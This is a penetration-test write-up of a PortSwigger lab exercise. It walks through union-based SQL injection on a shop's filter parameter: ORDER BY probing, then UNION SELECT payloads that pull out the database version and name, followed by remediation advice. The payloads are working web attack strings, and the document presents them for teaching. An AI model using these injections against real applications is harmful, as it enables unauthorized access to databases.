# Executive Summary

This report documents a successfull UNION based SQL injection attack performed on the application's filtering functionality. While the primary objective was to the identify the structural vulnerability of the query, the testing successfully bypassed security bouddaries to reveal **hidden system data**, specifically the **database name** and **Database Version**.
This assessment was performed for educational purposes to demonstrate common web application vulnerabilities and remediation strategies.

**Key Finding:** High-severity SQL Injection (CWE-89) on filtering function.
**Impact:** Hidden System data revealed. 
**Status:** Proof of Concept Achieved

# 1. Scope and Objectives

## Scope
- **Application:** PortSwigger Lab (intentionally vulnerable web application)
- **Environment:** Local Kali Linux deployment
- **Target Component:** PortSwigger Shopping Website
- **Testing Method:** Manual penetration testing

## Objectives
- Identify and exploit vulnerabilities
- Demonstrate SQL injection techniques
- Document findings and remediation steps
---

# 2. Technincal Finding

## Description 
The website's filtering function in vulnerable to SQL injection because it fails to utilize parameterized queries or prepared statements. By manually injecting SQL payload into the URL parameters, i was able to extract sensitive data. While the initial scope was limited to determining the query's column count, I successfully leveraged the vulnerability to display the **Database Name** and **Database Version** directly on the webpage.

# 3. Steps to Reproduce

## 1. Determine the Column Count
Inject the ORDER BY clause into the vulnerable parameter to identify the number of columns being returned by the original query.

```SQL
' ORDER BY 1--
```

![ORDERBY payload](sqli-union-attack/1.png)

```SQL
' ORDER BY 2--
```

![ORDERBY payload](sqli-union-attack/2.png)

```SQL
' ORDER BY 3--
```

![ORDERBY payload](sqli-union-attack/3.png)

```SQL
' ORDER BY 4--
```

![ORDERBY payload](sqli-union-attack/4.png)

**Result** 
The error on the 4thh Column confirms that the query contains exactly **3 Column**

## 2. Indentify the Suitable column for Data Extraction
After confirming a 3-columm structure, I used a UNION SELECT attack to identify which column could render string data onto the webpage. I tested each column sequentially by replacing NULL with the string 'Test':
- **Payload 1:**
```
' UNION SELECT 'Test', NULL, NULL--
```
**Result:** Error (Likely due to a data type mismatch, e.g., the column expects an Integer).

- **Payload 2:**
```
' UNION SELECT NULL,'Test', NULL--
```
**Result:** Success. The word Test appeared on the webpage

- **Payload 3:**
```
' UNION SELECT NULL, NULL, 'Test'--
```
**Result:** Error. (Likely due to a data type mismatch again)

Only the second column is configured to display string data on the Web Page, making it the necessary injection point for extracting database information.

## 3. Extract Database Metadata
Since we know the second column is vulnerable, we can use this to extract the database version and name.
- **To retrieve the Database Version:** 'UNION SELECT NULL, version(), NULL --

**RESULT**

![DATABASE Version](sqli-union-attack/version.png)

- **To retrieve the Database Name:** ' UNION SELECT NULL, current_database(), NULL--

**RESULT**


 ![DATABASE Name](sqli-union-attack/name.png)

# 4. Technical Analysis
The SQL Injection vulnerablity exists because
- **No Input Validation:** The filter function accepts special SQL characters (',-- etc.)
- **No Parameterized Queries:** Application uses string concatenation instead of prepared statements.

# 5. Remediation recommendations

To prevent this, the development team should implement the following:
- **Use PreparedStatements:** This ensures the database treats the input as data only, not as executable code.
- **Input Validation:** Whitelist allowed characters in username field (alphanumeric + underscore only). Reject inputs containing SQL keywords (SELECT, UNION, OR, --,etc.)

---

# 5. Conclusion
This pentration test successfully identified a Critical Union-based SQL Injection Vulnerability within the PortSwigger lab's filter functionality. The assessment demonstrated that an attack can bypass input filters to manipulate backend queries, leading to  unauthorized diclosure of system metedata, including database name and version details.

The vulnerability provides a foothold for further exploitation, such as full database schema extraction or unauthorized access to sensitive user data. Implementing parameterized queries and strict input validation is required to mitigate this risk. 


## Summary
- **Report Status:** Complete
- **Severity Level:** High
- **Remediation:** Timeline: Immediate
